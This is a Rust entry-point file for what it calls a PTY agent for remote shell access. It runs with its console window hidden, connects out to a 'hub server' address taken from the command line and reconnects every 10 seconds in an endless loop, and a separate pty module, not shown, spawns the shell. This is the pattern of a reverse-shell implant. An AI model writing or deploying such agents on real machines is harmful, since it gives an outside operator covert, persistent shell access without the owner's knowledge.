#![windows_subsystem = "windows"]

//! PTY (Pseudo-Terminal) Agent for remote shell access
//! 
//! This agent connects to a hub server and provides PTY access over TCP



//! PTY agent binary entrypoint.
//!
//! Starts the agent process which repeatedly attempts to connect to the
//! hub server and spawns a pseudo-terminal session on successful handshake.
//! The actual PTY logic lives in the `pty` module; this file keeps the
//! runtime loop and reconnect behavior minimal and portable.
//!
mod pty;

/// Entry point for the PTY agent
/// 
/// Connects to a hub server (default: 127.0.0.1:80) and spawns shell sessions
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    let mut servidor_addr = "127.0.0.1:80".to_string();
    
    if args.len() >= 2 {
        servidor_addr = args[1].clone();
    }

    println!("🚀 Agent started to: {}", servidor_addr);

    let mut attempts = 0;

    loop {
        attempts += 1;
        println!("🔄 Connecting.. #{}...", attempts);
        match pty::run(servidor_addr.clone()).await {
            Ok(_) => {
                // Si pty::run acaba con éxito (por ejemplo, cierre voluntario)
                println!("✅ Connection closed!!!");
            }
            Err(e) => {
                // Si pty::run falla (servidor caído, timeout, etc.)
                eprintln!("⚠️ Connection Error: {}", e);
            }
        }

        // Si llegamos aquí, es que la conexión ha fallado o se ha cortado
        println!("⏳ Reconnect in 10 seconds...");
        sleep(Duration::from_secs(10)).await;
    }
}